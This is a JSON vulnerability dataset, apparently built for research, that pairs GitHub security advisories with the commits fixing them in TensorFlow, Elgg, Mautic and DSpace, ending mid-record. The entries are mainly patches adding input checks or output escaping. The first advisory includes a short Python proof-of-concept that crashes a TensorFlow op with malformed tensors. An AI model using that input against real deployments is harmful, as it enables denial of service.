{
    "schema":{
        "fields":[
            {
                "name":"index",
                "type":"integer"
            },
            {
                "name":"vuln_id",
                "type":"string"
            },
            {
                "name":"cwe_id",
                "type":"string"
            },
            {
                "name":"score",
                "type":"number"
            },
            {
                "name":"chain",
                "type":"string"
            },
            {
                "name":"dataset",
                "type":"string"
            },
            {
                "name":"summary",
                "type":"string"
            },
            {
                "name":"published_date",
                "type":"string"
            },
            {
                "name":"chain_len",
                "type":"integer"
            },
            {
                "name":"project",
                "type":"string"
            },
            {
                "name":"commit_href",
                "type":"string"
            },
            {
                "name":"commit_sha",
                "type":"string"
            },
            {
                "name":"patch",
                "type":"string"
            },
            {
                "name":"chain_ord",
                "type":"string"
            },
            {
                "name":"before_first_fix_commit",
                "type":"string"
            },
            {
                "name":"last_fix_commit",
                "type":"string"
            },
            {
                "name":"chain_ord_pos",
                "type":"number"
            },
            {
                "name":"commit_datetime",
                "type":"string"
            },
            {
                "name":"message",
                "type":"string"
            },
            {
                "name":"author",
                "type":"string"
            },
            {
                "name":"comments",
                "type":"string"
            },
            {
                "name":"stats",
                "type":"string"
            },
            {
                "name":"files",
                "type":"string"
            },
            {
                "name":"message_norm",
                "type":"string"
            },
            {
                "name":"language",
                "type":"string"
            },
            {
                "name":"entities",
                "type":"string"
            },
            {
                "name":"classification_level_1",
                "type":"number"
            },
            {
                "name":"classification_level_2",
                "type":"number"
            },
            {
                "name":"list_files",
                "type":"string"
            },
            {
                "name":"num_files",
                "type":"number"
            },
            {
                "name":"patch_content",
                "type":"string"
            },
            {
                "name":"code_diff",
                "type":"string"
            }
        ],
        "primaryKey":[
            "index"
        ],
        "pandas_version":"1.4.0"
    },
    "data":[
        {
            "index":135,
            "vuln_id":"GHSA-h2wq-prv9-2f56",
            "cwe_id":"{'CWE-20'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58'}",
            "dataset":"osv",
            "summary":"Missing validation crashes `QuantizeAndDequantizeV4Grad` ### Impact\nThe implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  axis=-1)\n```\n\nThe code assumes `input_min` and `input_max` are scalars but there is no validation for this.\n\n### Patches\nWe have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
            "published_date":"2022-05-24",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58",
            "commit_sha":"098e7762d909bac47ce1dbabe6dfd06294cb9d58",
            "patch":"SINGLE",
            "chain_ord":"['098e7762d909bac47ce1dbabe6dfd06294cb9d58']",
            "before_first_fix_commit":"{'e505acc64062d9250ad4452ce57529bed8fd2160'}",
            "last_fix_commit":"098e7762d909bac47ce1dbabe6dfd06294cb9d58",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/28\/2022, 18:06:02",
            "message":"Fix tf.raw_ops.QuantizeAndDequantizeV4Grad vulnerability with invalid input_min or input_max.\n\nCheck that argument is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445198280",
            "author":"Alan Liu",
            "comments":null,
            "stats":"{'additions': 8, 'deletions': 2, 'total': 10}",
            "files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 8, 'deletions': 2, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/098e7762d909bac47ce1dbabe6dfd06294cb9d58\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -174,13 +174,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n     OP_REQUIRES(ctx,\\n                 input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input min tensor must have dimension 1. Recieved \",\\n+                    \"Input min tensor must have dimension 0 or 1. Received \",\\n                     input_min_tensor.dims(), \".\"));\\n     const Tensor& input_max_tensor = ctx->input(3);\\n     OP_REQUIRES(ctx,\\n                 input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input max tensor must have dimension 1. Recieved \",\\n+                    \"Input max tensor must have dimension 0 or 1. Received \",\\n                     input_max_tensor.dims(), \".\"));\\n     if (axis_ != -1) {\\n       OP_REQUIRES(\\n@@ -203,6 +203,12 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n                    ctx->allocate_output(2, min_max_shape, &input_max_backprop));\\n \\n     if (axis_ == -1) {\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_min_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_min must be a scalar if axis is unspecified\"));\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_max_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_max must be a scalar if axis is unspecified\"));\\n       functor::QuantizeAndDequantizeOneScaleGradientFunctor<Device, T> f;\\n       f(ctx->eigen_device<Device>(), gradient.template flat<T>(),\\n         input.template flat<T>(), input_min_tensor.scalar<T>(),'}}",
            "message_norm":"fix tf.raw_ops.quantizeanddequantizev4grad vulnerability with invalid input_min or input_max.\n\ncheck that argument is actually a scalar before treating it as such.\n\npiperorigin-revid: 445198280",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('445198280', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])",
            "num_files":1.0,
            "patch_content":"From 098e7762d909bac47ce1dbabe6dfd06294cb9d58 Mon Sep 17 00:00:00 2001\nFrom: Alan Liu <liualan@google.com>\nDate: Thu, 28 Apr 2022 11:06:02 -0700\nSubject: [PATCH] Fix tf.raw_ops.QuantizeAndDequantizeV4Grad vulnerability with\n invalid input_min or input_max.\n\nCheck that argument is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445198280\n---\n tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc | 10 ++++++++--\n 1 file changed, 8 insertions(+), 2 deletions(-)\n\ndiff --git a\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc b\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc\nindex d63a49a04be621..da9257fb9c9af1 100644\n--- a\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc\n+++ b\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc\n@@ -174,13 +174,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\n     OP_REQUIRES(ctx,\n                 input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\n                 errors::InvalidArgument(\n-                    \"Input min tensor must have dimension 1. Recieved \",\n+                    \"Input min tensor must have dimension 0 or 1. Received \",\n                     input_min_tensor.dims(), \".\"));\n     const Tensor& input_max_tensor = ctx->input(3);\n     OP_REQUIRES(ctx,\n                 input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\n                 errors::InvalidArgument(\n-                    \"Input max tensor must have dimension 1. Recieved \",\n+                    \"Input max tensor must have dimension 0 or 1. Received \",\n                     input_max_tensor.dims(), \".\"));\n     if (axis_ != -1) {\n       OP_REQUIRES(\n@@ -203,6 +203,12 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\n                    ctx->allocate_output(2, min_max_shape, &input_max_backprop));\n \n     if (axis_ == -1) {\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_min_tensor.shape()),\n+                  errors::InvalidArgument(\n+                      \"input_min must be a scalar if axis is unspecified\"));\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_max_tensor.shape()),\n+                  errors::InvalidArgument(\n+                      \"input_max must be a scalar if axis is unspecified\"));\n       functor::QuantizeAndDequantizeOneScaleGradientFunctor<Device, T> f;\n       f(ctx->eigen_device<Device>(), gradient.template flat<T>(),\n         input.template flat<T>(), input_min_tensor.scalar<T>(),",
            "code_diff":"@@ -174,13 +174,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\n     OP_REQUIRES(ctx,\n                 input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\n                 errors::InvalidArgument(\n-                    \"Input min tensor must have dimension 1. Recieved \",\n+                    \"Input min tensor must have dimension 0 or 1. Received \",\n                     input_min_tensor.dims(), \".\"));\n     const Tensor& input_max_tensor = ctx->input(3);\n     OP_REQUIRES(ctx,\n                 input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\n                 errors::InvalidArgument(\n-                    \"Input max tensor must have dimension 1. Recieved \",\n+                    \"Input max tensor must have dimension 0 or 1. Received \",\n                     input_max_tensor.dims(), \".\"));\n     if (axis_ != -1) {\n       OP_REQUIRES(\n@@ -203,6 +203,12 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\n                    ctx->allocate_output(2, min_max_shape, &input_max_backprop));\n \n     if (axis_ == -1) {\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_min_tensor.shape()),\n+                  errors::InvalidArgument(\n+                      \"input_min must be a scalar if axis is unspecified\"));\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_max_tensor.shape()),\n+                  errors::InvalidArgument(\n+                      \"input_max must be a scalar if axis is unspecified\"));\n       functor::QuantizeAndDequantizeOneScaleGradientFunctor<Device, T> f;\n       f(ctx->eigen_device<Device>(), gradient.template flat<T>(),\n         input.template flat<T>(), input_min_tensor.scalar<T>(),"
        },
        {
            "index":474,
            "vuln_id":"GHSA-2xw8-j43j-5vxp",
            "cwe_id":"{'CWE-79'}",
            "score":5.4,
            "chain":"{'https:\/\/github.com\/elgg\/elgg\/commit\/c30b17bf75256ed3fcc84e2083147cc3951423d0'}",
            "dataset":"osv",
            "summary":"elgg is vulnerable to Cross-site Scripting elgg is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
            "published_date":"2022-01-06",
            "chain_len":1,
            "project":"https:\/\/github.com\/elgg\/elgg",
            "commit_href":"https:\/\/github.com\/elgg\/elgg\/commit\/c30b17bf75256ed3fcc84e2083147cc3951423d0",
            "commit_sha":"c30b17bf75256ed3fcc84e2083147cc3951423d0",
            "patch":"SINGLE",
            "chain_ord":"['c30b17bf75256ed3fcc84e2083147cc3951423d0']",
            "before_first_fix_commit":"{'ea72485b6a08f30f452b8e5425310f2b3546050c'}",
            "last_fix_commit":"c30b17bf75256ed3fcc84e2083147cc3951423d0",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/06\/2021, 14:39:10",
            "message":"fix(reported_content): sanitize report URLs",
            "author":"Jer\u00f4me Bakker",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'mod\/reportedcontent\/actions\/reportedcontent\/add.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Elgg\/Elgg\/raw\/c30b17bf75256ed3fcc84e2083147cc3951423d0\/mod%2Freportedcontent%2Factions%2Freportedcontent%2Fadd.php', 'patch': '@@ -18,7 +18,7 @@\\n $report = new ElggReportedContent();\\n $report->owner_guid = elgg_get_logged_in_user_guid();\\n $report->title = $title;\\n-$report->address = $address;\\n+$report->address = elgg_normalize_site_url($address);\\n $report->description = $description;\\n $report->access_id = $access;'}}",
            "message_norm":"fix(reported_content): sanitize report urls",
            "language":"ro",
            "entities":"[('fix(reported_content', 'ACTION', ''), ('sanitize', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['mod\/reportedcontent\/actions\/reportedcontent\/add.php'])",
            "num_files":1.0,
            "patch_content":"From c30b17bf75256ed3fcc84e2083147cc3951423d0 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jer=C3=B4me=20Bakker?= <jeabakker@coldtrick.com>\nDate: Mon, 6 Dec 2021 15:39:10 +0100\nSubject: [PATCH] fix(reported_content): sanitize report URLs\n\n---\n mod\/reportedcontent\/actions\/reportedcontent\/add.php | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/mod\/reportedcontent\/actions\/reportedcontent\/add.php b\/mod\/reportedcontent\/actions\/reportedcontent\/add.php\nindex f45a500eb52..dff05fb6fec 100644\n--- a\/mod\/reportedcontent\/actions\/reportedcontent\/add.php\n+++ b\/mod\/reportedcontent\/actions\/reportedcontent\/add.php\n@@ -18,7 +18,7 @@\n $report = new ElggReportedContent();\n $report->owner_guid = elgg_get_logged_in_user_guid();\n $report->title = $title;\n-$report->address = $address;\n+$report->address = elgg_normalize_site_url($address);\n $report->description = $description;\n $report->access_id = $access;",
            "code_diff":"@@ -18,7 +18,7 @@\n $report = new ElggReportedContent();\n $report->owner_guid = elgg_get_logged_in_user_guid();\n $report->title = $title;\n-$report->address = $address;\n+$report->address = elgg_normalize_site_url($address);\n $report->description = $description;\n $report->access_id = $access;"
        },
        {
            "index":934,
            "vuln_id":"GHSA-fx5c-h9f6-rv7c",
            "cwe_id":"{'CWE-617'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6'}",
            "dataset":"osv",
            "summary":"`CHECK`-fails due to attempting to build a reference tensor ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [Grappler optimizer would attempt to build a tensor using a reference `dtype`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L1328-L1402). This would result in a crash due to a `CHECK`-fail [in the `Tensor` constructor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/tensor.cc#L733-L781) as reference types are not allowed.\n### Patches\nWe have patched the issue in GitHub commit [6b5adc0877de832b2a7c189532dbbbc64622eeb6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6",
            "commit_sha":"6b5adc0877de832b2a7c189532dbbbc64622eeb6",
            "patch":"SINGLE",
            "chain_ord":"['6b5adc0877de832b2a7c189532dbbbc64622eeb6']",
            "before_first_fix_commit":"{'af2cab9355e8d5bf48c2c7042b3faaf31262ea8c'}",
            "last_fix_commit":"6b5adc0877de832b2a7c189532dbbbc64622eeb6",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/13\/2021, 15:28:58",
            "message":"Prevent `CHECK`-fail when building reference tensor.\n\nThe tensor constructor does not allow reference dtypes, as these should not show up explicitly. However, when passed these invalid types instead of building an invalid object the constructor crashes via a `CHECK`-fail. We have a static builder that properly handles this case but is not applicable given current usage.\n\nInstead, before calling the constructor, we can check that the dtype is not a reference type and return an error otherwise, given that the dtype is user controlled so malicious users can trigger denial of service.\n\nPiperOrigin-RevId: 409662503\nChange-Id: I5892f831fde7f276cd7ab34519cf6b8061c71a59",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 5, 'deletions': 0, 'total': 5}",
            "files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6b5adc0877de832b2a7c189532dbbbc64622eeb6\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1363,6 +1363,11 @@ Status ConstantFolding::EvaluateOneFoldable(const NodeDef& node,\\n                           input_tensor.ToString(),\\n                           \" has a dtype of DT_INVALID.\"));\\n     }\\n+    if (IsRefType(raw_val.dtype())) {\\n+      return errors::InvalidArgument(\\n+          \"Not allowed to construct a tensor with reference dtype, got \",\\n+          DataTypeString(raw_val.dtype()));\\n+    }\\n     Tensor* value = new Tensor(raw_val.dtype(), raw_val.tensor_shape());\\n     if (!value->FromProto(raw_val)) {\\n       delete (value);'}}",
            "message_norm":"prevent `check`-fail when building reference tensor.\n\nthe tensor constructor does not allow reference dtypes, as these should not show up explicitly. however, when passed these invalid types instead of building an invalid object the constructor crashes via a `check`-fail. we have a static builder that properly handles this case but is not applicable given current usage.\n\ninstead, before calling the constructor, we can check that the dtype is not a reference type and return an error otherwise, given that the dtype is user controlled so malicious users can trigger denial of service.\n\npiperorigin-revid: 409662503\nchange-id: i5892f831fde7f276cd7ab34519cf6b8061c71a59",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('error', 'FLAW', ''), ('malicious', 'SECWORD', ''), ('denial of service', 'SECWORD', ''), ('409662503', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])",
            "num_files":1.0,
            "patch_content":"From 6b5adc0877de832b2a7c189532dbbbc64622eeb6 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Sat, 13 Nov 2021 07:28:58 -0800\nSubject: [PATCH] Prevent `CHECK`-fail when building reference tensor.\n\nThe tensor constructor does not allow reference dtypes, as these should not show up explicitly. However, when passed these invalid types instead of building an invalid object the constructor crashes via a `CHECK`-fail. We have a static builder that properly handles this case but is not applicable given current usage.\n\nInstead, before calling the constructor, we can check that the dtype is not a reference type and return an error otherwise, given that the dtype is user controlled so malicious users can trigger denial of service.\n\nPiperOrigin-RevId: 409662503\nChange-Id: I5892f831fde7f276cd7ab34519cf6b8061c71a59\n---\n tensorflow\/core\/grappler\/optimizers\/constant_folding.cc | 5 +++++\n 1 file changed, 5 insertions(+)\n\ndiff --git a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\nindex d5fadb311a75cc..281806be20259f 100644\n--- a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n+++ b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n@@ -1363,6 +1363,11 @@ Status ConstantFolding::EvaluateOneFoldable(const NodeDef& node,\n                           input_tensor.ToString(),\n                           \" has a dtype of DT_INVALID.\"));\n     }\n+    if (IsRefType(raw_val.dtype())) {\n+      return errors::InvalidArgument(\n+          \"Not allowed to construct a tensor with reference dtype, got \",\n+          DataTypeString(raw_val.dtype()));\n+    }\n     Tensor* value = new Tensor(raw_val.dtype(), raw_val.tensor_shape());\n     if (!value->FromProto(raw_val)) {\n       delete (value);",
            "code_diff":"@@ -1363,6 +1363,11 @@ Status ConstantFolding::EvaluateOneFoldable(const NodeDef& node,\n                           input_tensor.ToString(),\n                           \" has a dtype of DT_INVALID.\"));\n     }\n+    if (IsRefType(raw_val.dtype())) {\n+      return errors::InvalidArgument(\n+          \"Not allowed to construct a tensor with reference dtype, got \",\n+          DataTypeString(raw_val.dtype()));\n+    }\n     Tensor* value = new Tensor(raw_val.dtype(), raw_val.tensor_shape());\n     if (!value->FromProto(raw_val)) {\n       delete (value);"
        },
        {
            "index":689,
            "vuln_id":"GHSA-pjpc-87mp-4332",
            "cwe_id":"{'CWE-79'}",
            "score":9.6,
            "chain":"{'https:\/\/github.com\/mautic\/mautic\/commit\/462eb596027fd949efbf9ac5cb2b376805e9d246'}",
            "dataset":"osv",
            "summary":"Cross-site Scripting vulnerability in Mautic's tracking pixel functionality ### Impact\n\nMautic allows you to track open rates by using tracking pixels. \nThe tracking information is stored together with extra metadata of the tracking request.\n\nThe output isn't sufficiently filtered when showing the metadata of the tracking information, which may lead to a vulnerable situation.\n\n### Patches\n\nPlease upgrade to 4.3.0\n\n### Workarounds\nNone.\n\n### References\n* Internally tracked under MST-38\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@mautic.org](mailto:security@mautic.org)",
            "published_date":"2022-05-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/mautic\/mautic",
            "commit_href":"https:\/\/github.com\/mautic\/mautic\/commit\/462eb596027fd949efbf9ac5cb2b376805e9d246",
            "commit_sha":"462eb596027fd949efbf9ac5cb2b376805e9d246",
            "patch":"SINGLE",
            "chain_ord":"['462eb596027fd949efbf9ac5cb2b376805e9d246']",
            "before_first_fix_commit":"{'d1518c24e45515d710d4e488bc33a14027b64194'}",
            "last_fix_commit":"462eb596027fd949efbf9ac5cb2b376805e9d246",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/23\/2022, 11:55:13",
            "message":"Merge pull request from GHSA-pjpc-87mp-4332\n\n* sanitise user agent before displaying\n\n* Update app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\n\nCo-authored-by: John Linhart <admin@escope.cz>\n\n* removed obsolete use statement\n\nCo-authored-by: John Linhart <admin@escope.cz>",
            "author":"mollux",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 1, 'total': 3}",
            "files":"{'app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mautic\/mautic\/raw\/462eb596027fd949efbf9ac5cb2b376805e9d246\/app%2Fbundles%2FEmailBundle%2FViews%2FSubscribedEvents%2FTimeline%2Findex.html.php', 'patch': \"@@ -8,6 +8,7 @@\\n  *\\n  * @license     GNU\/GPLv3 http:\/\/www.gnu.org\/licenses\/gpl-3.0.html\\n  *\/\\n+\\n if ($item = ((isset($event['extra'])) ? $event['extra']['stat'] : false)): ?>\\n     <p>\\n         <?php if (!empty($item['isFailed'])) : ?>\\n@@ -63,7 +64,7 @@\\n             endif;\\n             ?>\\n             <?php if ($counter > 1): ?><hr\/><?php endif; ?>\\n-            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $detail['useragent']; ?>\\n+            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $view->escape($detail['useragent']); ?>\\n             <?php ++$counter; ?>\\n         <?php endforeach; ?>\\n         <?php\"}}",
            "message_norm":"merge pull request from ghsa-pjpc-87mp-4332\n\n* sanitise user agent before displaying\n\n* update app\/bundles\/emailbundle\/views\/subscribedevents\/timeline\/index.html.php\n\nco-authored-by: john linhart <admin@escope.cz>\n\n* removed obsolete use statement\n\nco-authored-by: john linhart <admin@escope.cz>",
            "language":"en",
            "entities":"[('ghsa-pjpc-87mp-4332', 'VULNID', 'GHSA'), ('sanitise', 'SECWORD', ''), ('update', 'ACTION', ''), ('admin@escope.cz', 'SECWORD', ''), ('removed', 'ACTION', ''), ('admin@escope.cz', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php'])",
            "num_files":1.0,
            "patch_content":"From 462eb596027fd949efbf9ac5cb2b376805e9d246 Mon Sep 17 00:00:00 2001\nFrom: mollux <mattias.michaux@dropsolid.com>\nDate: Mon, 23 May 2022 13:55:13 +0200\nSubject: [PATCH] Merge pull request from GHSA-pjpc-87mp-4332\n\n* sanitise user agent before displaying\n\n* Update app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\n\nCo-authored-by: John Linhart <admin@escope.cz>\n\n* removed obsolete use statement\n\nCo-authored-by: John Linhart <admin@escope.cz>\n---\n ...\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a\/app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php b\/app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\nindex a7613b3bc89..d74a1d91384 100755\n--- a\/app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\n+++ b\/app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\n@@ -8,6 +8,7 @@\n  *\n  * @license     GNU\/GPLv3 http:\/\/www.gnu.org\/licenses\/gpl-3.0.html\n  *\/\n+\n if ($item = ((isset($event['extra'])) ? $event['extra']['stat'] : false)): ?>\n     <p>\n         <?php if (!empty($item['isFailed'])) : ?>\n@@ -63,7 +64,7 @@\n             endif;\n             ?>\n             <?php if ($counter > 1): ?><hr\/><?php endif; ?>\n-            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $detail['useragent']; ?>\n+            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $view->escape($detail['useragent']); ?>\n             <?php ++$counter; ?>\n         <?php endforeach; ?>\n         <?php",
            "code_diff":"@@ -8,6 +8,7 @@\n  *\n  * @license     GNU\/GPLv3 http:\/\/www.gnu.org\/licenses\/gpl-3.0.html\n  *\/\n+\n if ($item = ((isset($event['extra'])) ? $event['extra']['stat'] : false)): ?>\n     <p>\n         <?php if (!empty($item['isFailed'])) : ?>\n@@ -63,7 +64,7 @@\n             endif;\n             ?>\n             <?php if ($counter > 1): ?><hr\/><?php endif; ?>\n-            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $detail['useragent']; ?>\n+            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $view->escape($detail['useragent']); ?>\n             <?php ++$counter; ?>\n         <?php endforeach; ?>\n         <?php"
        },
        {
            "index":24,
            "vuln_id":"GHSA-763j-q7wv-vf3m",
            "cwe_id":"{'CWE-601'}",
            "score":7.1,
            "chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de'}",
            "dataset":"osv",
            "summary":"JSPUI's controlled vocabulary feature vulnerable to Open Redirect before v6.4 and v5.11 ### Impact\nThe JSPUI controlled vocabulary servlet is vulnerable to an open redirect attack, where an attacker can craft a malicious URL that looks like a legitimate DSpace\/repository URL.  When that URL is clicked by the target, it redirects them to a site of the attacker's choice.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.x via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9.patch (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.x via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de.patch (may be applied manually if an immediate upgrade to 5.11 or 6,4 or above is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered and reported by Johannes Moritz of Ripstech.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org",
            "published_date":"2022-08-06",
            "chain_len":2,
            "project":"https:\/\/github.com\/DSpace\/DSpace",
